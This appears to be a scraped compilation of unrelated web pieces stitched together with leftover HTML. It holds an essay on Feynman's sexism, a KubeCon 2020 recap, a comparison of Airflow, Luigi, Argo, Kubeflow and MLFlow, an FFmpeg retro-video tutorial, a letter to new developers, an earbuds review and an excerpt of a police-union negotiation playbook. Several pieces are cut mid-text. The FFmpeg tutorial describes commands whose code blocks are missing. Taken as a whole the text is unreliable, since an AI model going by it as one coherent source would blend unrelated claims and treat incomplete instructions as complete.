<p>I was most unsettled by a story<sup><a href="#1">1</a></sup> about one of his nude portraits, featuring, in his words, “a beautiful blonde model” to which he gave the title “Madame Curie<sup><a href="#3">3</a></sup> Observing the Radiations from Radium.”</p>
<blockquote>
<p>…The message I intended to convey was, nobody thinks of Madame Curie as a woman, as feminine, with beautiful hair, bare breasts, and all that. They only think of the radium part.</p>
</blockquote>
<p>Why was I so bothered by this amidst the other accounts of harassment and discrimination? I realized that throughout my growing disappointment with Feynman, I still clung to the belief that he reserved some measure of respect for his fellow scientists, regardless of their gender or other characteristics. But now I was forced to consider that he likely regarded all women (even two time Nobel Prize winners) as little more than objects for his shallow enjoyment, who served no purpose beyond acting as ‘muses’ for his own great scientific endeavors. Sexism in any context is unacceptable, but for me, this case hit especially close to home.</p>

<p>Why should we care about the bad behavior of a brilliant physicist who died more than thirty years ago? Why can’t we separate Feynman’s scientific achievements from his other actions, and write off his sexism as a product of its time? Because the power structures that enabled Feynman’s sexism then are the same ones that now allow us to forget his conduct, remembering him only as a great scientist. They let famed astronomer <a href="https://www.buzzfeednews.com/article/azeenghorayshi/how-harassment-stays-secret" target="_blank">Geoff Marcy</a> engage in decades of sexual predation in his field and permitted Caltech to preserve <a href="https://www.buzzfeednews.com/article/azeenghorayshi/ott-harassment-investigation" target="_blank">Christian Ott’s</a> professorship after he harassed his female students. And now, they allow Caltech professors to continue defending Ott to my peers and me, claiming that the female students who endured his inappropriate and discriminatory behavior “ruined his career.”</p>
<p>For female scientists, sexual harassment remains a common experience. A study by the National Academy of Sciences reports that in academic science, engineering, and medicine, more than 50 percent of female faculty/staff and 20-50 percent of female students at all levels have experienced harassment.<sup><a href="#4">4</a></sup> These numbers are significantly higher for women of color.<sup><a href="#4">4</a>,<a href="#5">5</a></sup> One of my closest friends at Caltech participated in the same NOAO internship as me the following year and was harassed by the same program director because our complaints that year weren’t taken seriously enough to warrant assigning another scientist to the position.</p>

<p>None of this is to paint Feynman as a villain; on some level I can understand his enduring popularity. A great teacher and scientific communicator, he is also proof that nerdy men can be funny, popular, and (reputedly) successful with women, and is perhaps idolized for these attributes as much as for his accomplishments in physics. In spite of his sexism, he encouraged his younger sister’s interest in science when their parents did not. Joan Feynman is now a solar astrophysicist who spent the bulk of her career at NASA. He also dealt with significant discrimination while climbing the scientific ivory tower in the 30’s and 40’s, which was then characterized by strong antisemitism.</p>
<p>But we must consider Feynman in all his manifestations—a brilliant scientist, but also a narcissist whose sexist behavior did undeniable harm. And while his contributions to physics are immense, it is worth considering that science is not, nor has it ever been, a level playing field. It is unlikely that Feynman would have been able to make the scientific strides he did if he had been born a hundred years earlier, when antisemitism would have barred him from elite academic spaces entirely. In the same vein, it is possible that someone else would have made Feynman’s discoveries decades before him if the world were truly fair. Perhaps it would have been a woman.</p>

Fear not! Read our main takeaways from KubeCon+CloudNativeCon Virtual Europe 2020.</span></p><h2>Non-technical thoughts</h2><p><span>The current pandemic forced us all to change our habits. Large in-person conferences feel like a luxury of the past. The Cloud Native Computing Foundation (CNCF) showed its resilience and commitment to keeping the community together: KubeCon moved virtual and was as good as a virtual event can get. The virtual lobby (illustrated below) welcomed attendees with the usual rooms — e.g. keynotes, sessions and expo hall — with long walks replaced by mouse clicks.</span></p><p><span>As with each KubeCon, the CNCF took diversity to the next level. Not only were women and other tech minorities given important roles within the CNCF and KubeCon, but the virtual nature of the conference gave access to participants that were previously excluded from KubeCon due to family commitments or prohibitive conference fees and travel costs. CNCF expects to publish its transparency reports next week.</span></p><p><span>Let us now focus on the major topics.</span></p><h2>Newly graduated and incubated projects</h2><p><a href="https://elastisys.com/wp-content/uploads/2020/08/graphic-chasm-3-02.svg"><img src="https://elastisys.com/wp-content/uploads/2020/08/graphic-chasm-3-02.svg" alt=""></a></p><p><span>The CNCF classifies projects as </span><a href="https://landscape.cncf.io/"><span>sandbox, incubating or graduated</span></a><span>, by assessing their technical and organizational maturity. Graduated projects solve a pressing need, feature a rich and diverse contributor base, and are battle tested in many production environments.</span></p><p><span>This year, we have two newly graduated projects:</span></p><ul><li><span>Helm, the Kubernetes package manager and</span></li><li><span>Harbor, the container registry with integrated vulnerability scanner.</span></li></ul><p><span>Several new projects have reached incubation status:</span></p><ul><li><span>Contour, the Envoy-based Ingress controller;</span></li><li><span>Cortex, a horizontally scalable, highly available, multi-tenant, long term Prometheus;</span></li><li><span>Operator framework, a foundation for extending the Kubernetes API;</span></li><li><span>K3s, the lightweight Kubernetes distribution;</span></li><li><span>Argo, a GitOps framework (more on GitOps below).</span></li></ul><h2>More focus on end-users</h2><p><img loading="lazy" src="https://elastisys.com/wp-content/uploads/2020/08/image-2-1-1024x559.png" alt="" width="1024" height="559" srcset="https://elastisys.com/wp-content/uploads/2020/08/image-2-1-1024x559.png 1024w, https://elastisys.com/wp-content/uploads/2020/08/image-2-1-300x164.png 300w, https://elastisys.com/wp-content/uploads/2020/08/image-2-1.png 1536w" sizes="(max-width: 1024px) 100vw, 1024px"></p><p><span>End-User Members are CNCF members that use cloud native technologies, but do not directly sell them. The more than 140 members include online shops, payment processors, and banks.</span></p><p><span>This year, the CNCF placed even more focus on end-users. Zalando was given the end-user award, to recognize its contribution to cloud native projects as an end-user. End-users with special requirements now have dedicated user groups, such as the telco user group and the financial user group. Finally, the CNCF published the first </span><a href="https://www.cncf.io/tech-radar"><span>Technology Radar</span></a><span> on GitOps (bear with me). This complements the CNCF-assessed project maturity, with end-users’ view on adoption.</span></p><h2>ClusterAPI: Use K8s to create K8s clusters</h2><p><a href="https://github.com/kubernetes-sigs/cluster-api"><span>ClusterAPI</span></a><span> is a declarative API to allow a manager Kubernetes (K8s) cluster to create/destroy/update target K8s cluster. The API is currently in v1alpha3, but is expected to hit beta soon. Its core idea is to replace cloud-provider-specific cluster creation APIs, such as AWS’s EKS, Google’s GKE or Azure’s AKS, with a cloud-agnostic one. ClusterAPI currently supports AWS, Google Cloud, VMware (kudos the sponsor demo!), Exoscale, and even bare-metal providers, like Baidu, Alibaba and Tencent.</span></p><p><span>ClusterAPI enables the increased tendency to see whole K8s clusters as throw-away, and is expected to become a key GitOps building block.</span></p><h2>GitOps: All system changes via Git commits</h2><p><span>Let us finally talk about GitOps. In brief, GitOps means making system changes via git commits. Besides producing a free audit trail of who did what, GitOps reduces tedious and error-prone human operations. System changes can be tested, can be reviewed, can be reliably applied and automated.</span></p><p><span>The key projects within GitOps are </span><a href="https://github.com/fluxcd/flux"><span>Flux</span></a><span> and </span><a href="https://helm.sh/"><span>Helm</span></a><span>.</span></p><h2>DevSecOps: Secure development at the speed of cloud native</h2><p><span>Kubernetes and Cloud Native technologies have demonstrated the ability to increase the velocity of software delivery. Now they need to prove that they can do so securely. As with previous years, “shift left” security continues. In essence, the security team no longer handles “low-level” security tasks, such as upgrading vulnerable packages, but rather empowers and supports developers to take care of security themselves. Hence, the security team is freed up for maintaining high-level security-related policies and tooling.</span></p><p><span>Major security topics at KubeCon included network policies, vulnerability scanning, intrusion detection and key management. Aqua Security gave an absolutely amazing tutorial on how to use </span><a href="https://github.com/aquasecurity/trivy"><span>Trivy</span></a><span> and </span><a href="https://www.openpolicyagent.org/"><span>OpenPolicyAgent</span></a><span> to keep your production environment free from </span><a href="https://cve.mitre.org/"><span>known vulnerabilities</span></a><span>. Shopify and Sysdig showcased intrusion detection using </span><a href="https://falco.org/"><span>Falco</span></a><span>. Cisco held a sponsor demo on how a single policy database can open up traffic in various locations, such as load-balancers, firewalls, security groups and cluster Ingress. When it comes to key management, SOPS provides easy Kubernetes secrets encryption/decryption via the cloud provider’s </span><a href="https://aws.amazon.com/kms/"><span>Key Management Service (KMS)</span></a><span>, while </span><a href="https://github.com/spiffe/spire"><span>SPIFFE/SPIRE</span></a><span> assigns attestable identity to nodes or containers in the K8s cluster.</span></p><h2>That’s all?</h2><p><span>I could go on and on and write about storage, edge native computing and telco-grade networking, but then I wouldn’t probably need to block 4 days of your time. ☺</span></p><p>If you want to hear more details, listen in to <a href="https://elastisys.com/summary-kubecon-cloudnativecon-eu-the-top-trends-and-news-from-the-worlds-hottest-cloud-conference/">our video where we summarize the major take-aways from KubeCon + CloudNativeCon Europe 2020</a>.</p><p><span>If you want more content about Kubernetes and trends in the Cloud Native space, follow us on <a href="https://www.linkedin.com/company/elastisys">LinkedIn</a> or <a href="https://twitter.com/elastisys">Twitter</a>.</span></p></div></div></div></div></div></div></div></div></section></div></div></div></div></div>]]>

There are newer contenders too, and they’re all growing fast. (<a href="https://star-history.t9t.io/#spotify/luigi&amp;argoproj/argo&amp;kubeflow/kubeflow&amp;mlflow/mlflow">source</a>)</figcaption></figure><h2><strong>Task orchestration tools and workflows</strong></h2><p>Recently there’s been <a href="https://huyenchip.com/2020/06/22/mlops.html">an explosion of new tools</a> for orchestrating task- and data workflows (sometimes referred to as “MLOps”). The quantity of these tools can make it hard to choose which ones to use and to understand how they overlap, so we decided to compare some of the most popular ones head to head.&nbsp;</p><p>Overall Apache Airflow is both the most popular tool and also the one with the broadest range of features, but Luigi is a similar tool that’s simpler to get started with. Argo is the one teams often turn to when they’re already using Kubernetes, and Kubeflow and MLFlow serve more niche requirements related to deploying machine learning models and tracking experiments.</p><p>Before we dive into a detailed comparison, it’s useful to understand some broader concepts related to task orchestration.</p><h2><strong>What is task orchestration and why is it useful?</strong></h2><p>Smaller teams usually start out by managing tasks manually – such as cleaning data, training machine learning models, tracking results, and deploying the models to a production server. As the size of the team and the solution grows, so does the number of repetitive steps. It also becomes more important that these tasks are executed reliably.</p><p>The complex ways these tasks depend on each other also increases. When you start out, you might have a <strong>pipeline</strong> of tasks that needs to be run once a week, or once a month. These tasks need to be run in a specific order. As you grow, this pipeline becomes a <strong>network </strong>with dynamic branches. In certain cases, some tasks set off other tasks, and these might depend on several other tasks running first.</p><p>This network can be modelled as a DAG – a Directed Acyclic Graph, which models each task and the dependencies between them.</p><figure id="w-node-8feefc03e37d-018ecc93"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5f3d5fc803a7a16ca9eda2c3_v545yQmSJm0bgn5gGK1gmAK4Jw1W232zutQ3zs32lDq0HxhsteO97EG2a7NnoObsNoE4Zl0084kpBwZCt7T-BiDil1Z-MvaE_s8C0Ytc7gN5bFnGibnOxWAbOnraEXLxZvAi5HcL.png" alt="A diagram showing a pipeline with simply connected tasks and a DAG with more complicated connections."></p><figcaption>A pipeline is a limited DAG where each task has one upstream and one downstream dependency at most.</figcaption></figure><p>Workflow orchestration tools allow you to define DAGs by specifying all of your tasks and how they depend on each other. The tool then executes these tasks on schedule, in the correct order, retrying any that fail before running the next ones. It also monitors the progress and notifies your team when failures happen.</p><p><a href="https://en.wikipedia.org/wiki/CI/CD">CI/CD</a> tools such as Jenkins are commonly used to automatically test and deploy code, and there is a strong parallel between these tools and task orchestration tools – but there are important distinctions too. Even though in theory <a href="http://blog.paracode.com/2017/10/08/airflow/">you can use these CI/CD tools to orchestrate dynamic, interlinked tasks</a>, at a certain level of complexity you’ll find it easier to use more general tools like Apache Airflow instead.</p><p>[Want more articles like this? <a href="https://datarevenue.com/signup">Sign up to our newsletter</a>.

With that context in mind, let’s see how some of the most popular workflow tools stack up.</p><h2><strong>Just tell me which one to use</strong></h2><p>You should probably use:</p><ul role="list"><li><a href="https://airflow.apache.org/"><strong>Apache Airflow</strong></a><strong> </strong>if you want the most full-featured, mature tool and you can dedicate time to learning how it works, setting it up, and maintaining it.</li><li><a href="https://github.com/spotify/luigi"><strong>Luigi</strong></a><strong> </strong>if you need something with an easier learning curve than Airflow. It has fewer features, but it’s easier to get off the ground.</li><li><a href="https://argoproj.github.io/"><strong>Argo</strong></a> if you’re already deeply invested in the Kubernetes ecosystem and want to manage all of your tasks as pods, defining them in YAML instead of Python.</li><li><a href="https://www.kubeflow.org/"><strong>KubeFlow</strong></a><strong> </strong>if you want to use Kubernetes but still define your tasks with Python instead of YAML.</li><li><a href="https://mlflow.org/"><strong>MLFlow</strong></a> if you care more about tracking experiments or tracking and deploying models using MLFlow’s predefined patterns than about finding a tool that can adapt to your existing custom workflows.</li></ul><h2><strong>Comparison table</strong></h2><figure id="w-node-abe9bcb589cf-018ecc93"><p><img src="https://global-uploads.webflow.com/5d3ec351b1eba4332d213004/5f3d5fc9ba987f20a06c2e7f_4JEzgpYZM7va4Dj7GHftJaIskEjGSalpTOn70ASVq7GFe0z5hcmbukEUWM5XG8E_mQDKEYkzIa_uvuMdGrUC8gvp6qC5dquz3aulcBtsqdk9JSHh0PkqdmP4AoEWngwZ6bNQAEvm.png" alt=""></p><figcaption>For more Machine Learning Tips - <a href="https://www.datarevenue.com/signup">Get our weekly newsletter</a></figcaption></figure><p>For a quick overview, we’ve compared the libraries when it comes to:&nbsp;</p><ul role="list"><li><strong>Maturity: </strong>based on the age of the project and the number of fixes and commits;</li><li><strong>Popularity:</strong> based on adoption and GitHub stars;</li><li><strong>Simplicity: </strong>based on ease of onboarding and adoption;</li><li><strong>Breadth:</strong> based on how specialized vs. how adaptable each project is;</li><li><strong>Language: </strong>based on the primary way you interact with the tool.</li></ul><p>These are not rigorous or scientific benchmarks, but they’re intended to give you a quick overview of how the tools overlap and how they differ from each other. For more details, see the head-to-head comparison below.</p><h2><strong>Luigi vs. Airflow</strong></h2><p>Luigi and Airflow solve similar problems, but Luigi is far simpler. It’s contained in a single component, while Airflow has multiple modules which can be configured in different ways. Airflow has a larger community and some extra features, but a much steeper learning curve. Specifically, Airflow is far more powerful when it comes to scheduling, and it provides a calendar UI to help you set up when your tasks should run. With Luigi, you need to write more custom code to run tasks on a schedule.</p><p>Both tools use Python and DAGs to define tasks and dependencies. Use Luigi if you have a small team and need to get started quickly. Use Airflow if you have a larger team and can take an initial productivity hit in exchange for more power once you’ve gotten over the learning curve.</p><h2><strong>Luigi vs. Argo</strong></h2><p>Argo is built on top of <a href="https://www.datarevenue.com/ml-tools/kubernetes">Kubernetes</a>, and each task is run as a separate Kubernetes pod. This can be convenient if you’re already using Kubernetes for most of your infrastructure, but it will add complexity if you’re not. Luigi is a Python library and can be installed with Python package management tools, such as pip and conda. Argo is a <a href="https://kubernetes.io/docs/concepts/extend-kubernetes/api-extension/custom-resources/">Kubernetes extension</a> and is installed using Kubernetes. While both tools let you define your tasks as DAGs, with Luigi you’ll use Python to write these definitions, and with Argo you’ll use YAML.</p><p>Use Argo if you’re already invested in Kubernetes and know that all of your tasks will be pods. You should also consider it if the developers who’ll be writing the DAG definitions are more comfortable with YAML than Python. Use Luigi if you’re not running on Kubernetes and have Python expertise on the team.</p><h2><strong>Luigi vs. Kubeflow</strong></h2><p>Luigi is a Python-based library for general task orchestration, while Kubeflow is a Kubernetes-based tool specifically for machine learning workflows. Luigi is built to orchestrate general tasks, while Kubeflow has prebuilt patterns for experiment tracking, hyper-parameter optimization, and serving Jupyter notebooks. Kubeflow consists of two distinct components: Kubeflow and Kubeflow Pipelines. The latter is focused on model deployment and CI/CD, and it can be used independently of the main Kubeflow features.</p><p>Use Luigi if you need to orchestrate a variety of different tasks, from data cleaning through model deployment. Use Kubeflow if you already use Kubernetes and want to orchestrate common machine learning tasks such as experiment tracking and model training.</p><h2><strong>Luigi vs. MLFlow</strong></h2><p>Luigi is a general task orchestration system, while MLFlow is a more specialized tool to help manage and track your machine learning lifecycle and experiments. You can use Luigi to define general tasks and dependencies (such as training and deploying a model), but you can import MLFlow directly into your machine learning code and use its helper function to log information (such as the parameters you’re using) and artifacts (such as the trained models). You can also use MLFlow as a command-line tool to serve models built with common tools (such as scikit-learn) or deploy them to common platforms (such as AzureML or Amazon SageMaker).</p><h2><strong>Airflow vs. Argo</strong></h2><p>Argo and Airflow both allow you to define your tasks as DAGs, but in Airflow you do this with Python, while in Argo you use YAML. Argo runs each task as a Kubernetes pod, while Airflow lives within the Python ecosystem. Canva evaluated both options before settling on Argo, and you can <a href="https://www.youtube.com/watch?v=oXPgX7G_eow">watch this talk to get their detailed comparison and evaluation</a>.</p><p>Use Airflow if you want a more mature tool and don’t care about Kubernetes. Use Argo if you’re already invested in Kubernetes and want to run a wide variety of tasks written in different stacks.</p><h2><strong>Airflow vs. Kubeflow</strong></h2><p>Airflow is a generic task orchestration platform, while Kubeflow focuses specifically on machine learning tasks, such as experiment tracking. Both tools allow you to define tasks using Python, but Kubeflow runs tasks on Kubernetes. Kubeflow is split into Kubeflow and Kubeflow Pipelines: the latter component allows you to specify DAGs, but it’s more focused on deployment and model serving than on general tasks.</p><p>Use Airflow if you need a mature, broad ecosystem that can run a variety of different tasks. Use Kubeflow if you already use Kubernetes and want more out-of-the-box patterns for machine learning solutions.</p><h2><strong>Airflow vs. MLFlow</strong></h2><p>Airflow is a generic task orchestration platform, while MLFlow is specifically built to optimize the machine learning lifecycle. This means that MLFlow has the functionality to run and track experiments, and to train and deploy machine learning models, while Airflow has a broader range of use cases, and you could use it to run any set of tasks. Airflow is a set of components and plugins for managing and scheduling tasks. MLFlow is a Python library you can import into your existing machine learning code and a command-line tool you can use to train and deploy machine learning models written in scikit-learn to Amazon SageMaker or AzureML.</p><p>Use MLFlow if you want an opinionated, out-of-the-box way of managing your machine learning experiments and deployments. Use Airflow if you have more complicated requirements and want more control over how you manage your machine learning lifecycle.</p><h2><strong>Argo vs. Kubeflow</strong></h2><p>Parts of Kubeflow (like Kubeflow Pipelines) are built on top of Argo, but Argo is built to orchestrate any task, while Kubeflow focuses on those specific to machine learning – such as experiment tracking, …</p></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
          
<p>I miss working with FFmpeg, so when I came across this <a href="https://www.gariany.com/2020/08/ffmpeg-step-by-step-retro-video-filter/(https://www.reddit.com/r/ffmpeg/comments/ibf0or/how_would_you_recreate_this_effect_with_ffmpeg/)">interesting challenge on Reddit</a>, I could not say no. I am currently looking for a new project as an Audio/Video software engineer or project manager and it was a nice break away from interviews. Are you currently hiring or have any interesting project proposals? <a href="https://www.gariany.com/contact">Get in touch with me!</a> 🌻</p>
<p>So, the challenge is to create a retro video filter using FFmpeg only for a given video. Here is my results:</p>

<h4 id="see-full-ffmpeg-code-bellow">See Full FFmpeg Code bellow</h4>
<p>Wofff… There is a lot to unpack here, but let's start with the assets. I remember seeing this amazing AI regenerative work recently done by <a href="https://www.youtube.com/channel/UCD8J_xbbBuGobmw_N5ga3MA">Denis Shiryaev</a> <a href="https://www.youtube.com/watch?v=VO_1AdYRGW8">San Francisco, a Trip down Market Street, April 14, 1906</a> based on the <a href="https://youtu.be/1Zmhr3ubG2E?t=194">original video</a>. Shout out to Denis, your work is remarkable!</p>
<p>I thought it will be fun to re-retro it. Also, it helps to compare with the original 1906 footage.</p>
<h3 id="step-1-masking-the-video">Step 1: Masking the Video:</h3>
<p>We start by creating a square to mask the video input to get that old round rectangle video feeling. I use <a href="https://imagemagick.org/index.php">ImageMagick</a> to compose the shape. I probably could have created this shape using an FFmpeg filter, but I was lazy and thought it will be useful to have a method to generally mask any video with any shape, even if this shape is a video file!</p>
<p>We start by creating the Round Rectangle we going to use to mask the video:</p>

convert -size 1000x1000 xc:transparent -fill green -stroke green -draw <span>"roundrectangle 0,0 1000,1000, 100,100"</span> square.png
</code></pre></div><p>Result:</p>

</code></pre></div><p>We start with an empty 1920x1080 canvas of pixels, setting “/dev/zero” as our data stream and RGB32 as our pixel format. I use this trick a lot so I can have full control over the overlays I'm about to draw on top. The only (and big) disadvantage is that “/dev/zero” is an endless stream of zeros, therefore we must limit the frames we are transcoding (using “-frames:v 30”).</p>
<p>Once we have the empty input, our ‘filter_complex’ chain starts with loading the “square.png” image and overlaying it in the center of the frame. We name this stream ‘canvas’. We then ‘punching a hole’ in it, using the ‘chromakey’ filter, with the color 0x008000 (or just green). We overlay this black frame with transparent round-square in the middle on top of the empty input and name this ‘canvas3’.</p>
<p>We load the input video ‘input.mp4’ and scaling it to our canvas. Notice, you probably want to calculate these beforehand as all of the scaling must be determined before running this command. The ‘[0:][i1]overlay[i2]’ filter is not really needed here, but we will use it to distort the video on the next part.</p>
<p>We then overlay the (no so much) distorted frame ‘i2’ and ‘canvas3’ (with the transparent hole in it) on top(!) and we name it ‘mix1’. Lastly, ‘[0:][mix1]overlay[o]’ is a simple copy and not really needed here, but will be used on the next part.</p>
<p>Again, this method should work with any green mask, including a video mask, which I find very cool for future artworks.</p>

</code></pre></div><p>Remember our ‘[i2]’ video stream we skipped above? Let's make it shake a little with some overlay manipulation. On the X value, the “if” function will random a number between 0 and 1, if the number is bigger than 0.2 (20%), it will move the overlay by 4 pixels. I've included a couple of seconds at the end of the video to look at the video shaking on a ‘still’ image to break down the effect.</p>
<p>To recolor the video, we use “colorchannelmixer” filter and set the color channels values to something resembling a sepia tone. Funny, this is a manipulated AI colored video that for some reason looked older to me with these colors, at least more than a grayscale video.</p>
<h3 id="step-3-overlaying-noise-grain-and-dirt">Step 3: Overlaying noise, grain, and dirt:</h3>
<p>So I went googling and found this video on YouTube (<a href="https://www.youtube.com/watch?v=9v9VVN1RE84">Damaged Old Film OVERLAY</a>), it was exactly what I was looking for. We do need to manipulate it a little would like to remove the green and overlay these old film imperfections ontop of our distorted video.</p>

<ol>
<li>Making the video mask shake</li>

</ol>
<p>Yes, this is quite complicated FFmpeg manipulation done in one FFmpeg execution, but only a basic understanding of FFmpeg filters is needed to accomplish such an effect.

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
		<p>Dear New Developer,</p>
<p>Congratulations! Let’s take a moment to celebrate the decision you’ve made to launch or redirect your career. What lies ahead is a lot of hard work, satisfaction, the occasional desire to throw your laptop out a window, and a ton of learning. That’s true of most professions, so you’re also in good company.</p>
<p>As a developer, you will solve a thousand puzzles, and then a thousand more. Your brain will stretch and grow. You will dream about databases or pixels or curly braces. I once had a dream where I was walking down a hallway, but the hallway <em>was my code</em>. It was a good dream. I found a bug.</p>
<p>Greg LeMond, a pro cyclist and three-time Tour de France winner, once said something about cycling that I want to share with you: <img data-attachment-id="6422" data-permalink="https://letterstoanewdeveloper.com/2020/04/27/it-never-gets-easier-you-just-go-faster/lemond/" data-orig-file="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png" data-orig-size="355,239" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="lemond" data-image-description="" data-medium-file="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=300" data-large-file="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=355" src="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=1100" alt="lemond" srcset="https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png 355w, https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=150 150w, https://letterstoanewdeveloper.files.wordpress.com/2020/04/lemond.png?w=300 300w" sizes="(max-width: 355px) 100vw, 355px"></p>
<p>“It never gets easier, you just go faster.”</p>
<p>In so many ways, that describes a career in software. The puzzles you struggle with today will be easy in a month or a year. You’ll learn new patterns and best practices. Then you’ll take on new, harder challenges. You’ll struggle with those and learn and grow. Then you’ll start the cycle (pun intended) all over again.</p>
<p>Something I’ll add, though, is that you’ll be able to approach later challenges with more experience and confidence. What we bring to our jobs is an accumulation of skills and experience. This isn’t linear. It sometimes goes smoothly, sometimes it’s faster than we imagine possible. Then there are stretches where it feels like we’re clambering around in the dark.</p>
<p>For instance, I was once asked to write a <a href="https://en.wikipedia.org/wiki/Wireless_Application_Protocol">WAP</a> application (think super early mobile apps before smart phones existed). I had absolutely no idea what I was doing and I was mostly left alone on the project. I started by drawing some screens, took a deep breath, and started building. It was really tough going, but so many lessons have stuck with me from that experience. My skills at breaking down challenges and approaching them bit by bit really improved. I became comfortable throwing away code because the first code I wrote was atrocious. Plus, the project was eventually canceled, which was entirely the right business decision. Through that, I learned about evaluating tradeoffs in terms of business value—my time was better spent on higher priority projects.</p>
<p>In my current adventure, nearly 20 years later, I’m once again writing a mobile app and applying all of those lessons. Picking up languages and frameworks that I haven’t used before is far less daunting. Ensuring that I’m working on the most important thing is a constant recalibration, but one that is comfortable now. Working through stumbling blocks one at a time and having patterns for getting through them is second nature.</p>
<p>Just like learning isn’t linear, neither are careers. Your path will be your own. What you are doing today may or may not be what you’re doing in ten years. You might go into any number of other areas in software, or stay the course as a developer. It’s your life and all those choices are equally valid. One of my former colleagues quit to make hand-built microphones; another makes goat cheese in the Catalan Pyrenees. My personal philosophy is that at each opportunity to make a career decision, you should pick the direction that interests you most. Just like you learn faster when you are interested in your subject, you will ship better software (or make better cheese) when you are interested in your job.</p>
<p>There’s much more I’d love to tell you, but this letter is growing long. I’ll add some concise tidbits before I end.</p>
<ul>
<li>You belong here. Try not to doubt that.</li>
<li>Get really good at debugging. It’s a skill and you will need it.</li>
<li>If you don’t respect your boss, or if they don’t respect you back, go find a new one.</li>
<li>Learning is part of your job. Make time for it.</li>
<li>Don’t be afraid to put your code in production.</li>
<li>Be a good team member. You will accomplish more and learn faster.</li>
<li>Ask lots of questions. Someone else probably wants to hear the answer.</li>
<li>And finally, have fun! You’ve got this!</li>
</ul>
<p>I wish you all the luck in the world!</p>
<p>Sincerely,<br>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>I was usually skeptical about spending little money on audio accessories, but when saw these pair of <a href="https://amzn.to/2YobSAO">Bluetooth wireless earbuds by Aukey for 25 dollars</a>, I decided to order them just to see how far the audio technology has gone at the affordable price range. Considering the price I wasn’t expecting much of them until I got them. Boy, I couldn’t believe how much they packed at the decent quality for that price.</p>
<p>Normally in my workouts, I would use the good old <a href="https://amzn.to/3l4JoGa">Apple EarPods with cable</a>, because I’d never had to think about charging them or losing them, just stick them in my ears and I’m ready to go. But these pair of Aukey changed that, and for the same price of Apple EarPods.</p>
<p>The battery could last for 8-10 hours, which means for at least 8 workouts until the next full charge. To fully charge the battery it takes around an hour and a half, which is acceptable. Not only I was happy with the battery life but also with the sound quality, it’s not the audiophile-level but it’s pretty decent considering the price. Other than that it includes a built-in mic, IPX4 splash-proof resistance, Bluetooth 4.1, 3 pairs of ear-tips and ear-hooks at different sizes for your ear, carrying pouch, and a USB cable.</p>
<p>Honestly, they really took me on surprise. If you are interested I wrote a full review on these earbuds on <a href="https://devandgear.com/posts/review-sport-wireless-bluetooth-earbuds-by-aukey/">Dev&amp;Gear</a>, you might wanna check it out.
All-around I highly recommend them for anyone who wants to have a decent pair of earbuds without spending too much.</p>

<p><em><strong>For paranoia, sheer cynicism and demonstration of unbridled self-interest there’s nothing that can beat this “playbook” created by the law firm of Lackie, Dammeier &amp; McGill for use by their clients: cop unions.</strong></em></p>
<p><em><strong>See how many of these tactics strike you as familiar in Fullerton. Paranoia, cynicism and self-interest. Check, check, check.</strong></em></p>

<p><strong>Lackie, Dammeier &amp; McGill</strong><br>
Former Cops Defending Current Ones</p>
<p><strong>Negotiations After Impasse –&nbsp;Association Options</strong><br>
In gearing up for negotiations, hopefully your association has developed some political ties with members of your governing body. Now is the time those political endorsements, favors, and friendships come into play. When negotiations reach an impasse, the association will have options which may be utilized simultaneously, or one before the other.</p>
<p><strong>Political Option</strong><br>
As most association leaders already know, associations should be selective in their battles. However, this does not mean that the association should roll over for everything either. Association respect (by the employer) is gained over years of actions or inactions. Associations who rarely, if ever, take things to the mat or challenge the employer gain little respect at the bargaining table or elsewhere. The flip side is also true. Those associations that battle over every minor issue may be seen as an association that simply cannot be pleased, so why bother. While it is a fine line, somewhere in the middle is where you want to be. The association should be like a quiet giant in the position of, “do as I ask and don’t piss me off.” Depending on the circumstances surrounding the negotiations impasse, there are various <strong>tools</strong> available to an association to put political pressure on the decision makers. A few things to keep in mind when utilizing these tools are the following:</p>
<p><strong>Public Message</strong><br>
Always keep this in mind. The public could care less about your pay, medical coverage and pension plan. All they want to know is “what is in it for them.” Any public positions or statements by the association should always keep that focus. The message should always be public safety first. You do not want wage increases for yourselves, but simply to attract better qualified candidates and to keep more experienced officers from leaving.</p>
<p><strong>The Future</strong><br>
Also keep in mind that once the fight is over, you and your members will still be working there. Avoid activities where one or just a few members are involved who can be singled out for retaliation. Always keep in mind your department policies and the law. You should be in very close contact with your association’s attorney during these times to ensure you are not going to get yourself or any of your members in trouble. For associations in the Legal Defense Fund, please keep in mind that concerted labor activity should always be discussed with the LDF Trustees prior to the activity to ensure coverage.</p>
<p><strong>Let the Debate Begin</strong><br>
Again, the ideas listed below are not in any particular order. Just as in your use-of-force guidelines, you can start with simple verbal commands or jump to a higher level, based on the circumstances.<br>
Keep in mind that most of these <strong>tools</strong> are not to deliver your message to the public but are designed to simply get the decision makers into giving in to your position.</p>
<ul>
<li><strong>Storm City Council</strong> – While an association is at impasse, no city council or governing board meeting should take place where members of your association and the public aren’t present publicly chastising them for their lack of concern for public safety.</li>
<li><strong>Picketing –</strong> Plan a few well organized picketing events. Keep these events spread out to avoid burning out your membership.</li>
<li><strong>Public Appearances</strong> – During impasse, the association should make known at every significant public event, such as parades, Christmas tree lightings, the Mayor’s Gala and any other event of interest to the decision makers, that the association is upset about the lack of concern for public safety.</li>
<li><strong>Newspaper Ads –</strong> Again, keep the message focused on “public safety.”</li>
<li><strong>Billboards</strong> – Nothing seems to get more attention than a billboard entering the city limits which reads that crime is up and the City could care less about your safety.</li>
